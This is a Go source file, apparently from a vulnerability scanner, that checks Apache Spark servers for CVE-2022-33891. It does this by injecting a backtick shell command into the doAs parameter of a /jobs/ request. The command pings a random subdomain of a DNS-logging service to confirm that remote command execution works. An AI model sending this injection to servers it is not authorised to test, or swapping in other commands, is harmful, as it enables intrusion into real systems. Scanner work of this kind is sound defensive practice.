package spark

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"time"
)

func CVE_2022_33891(u string) bool {
	if util.CeyeApi != "" && util.CeyeDomain != "" {
		randomstr := util.RandomStr()
		payload := fmt.Sprintf("doAs=`ping%%20%s`", randomstr+"."+util.CeyeDomain)
		req, _ := util.HttpRequset(u+"/jobs/?"+payload, "GET", "", false, nil)
		time.Sleep(3 * time.Second)
		if util.Dnslogchek(randomstr) {
			util.SendLog(req.RequestUrl, "CVE_2022_33891", "Found vuln Apache Spark CVE_2022_33891", payload)
			return true
		}
	}
	return false
}
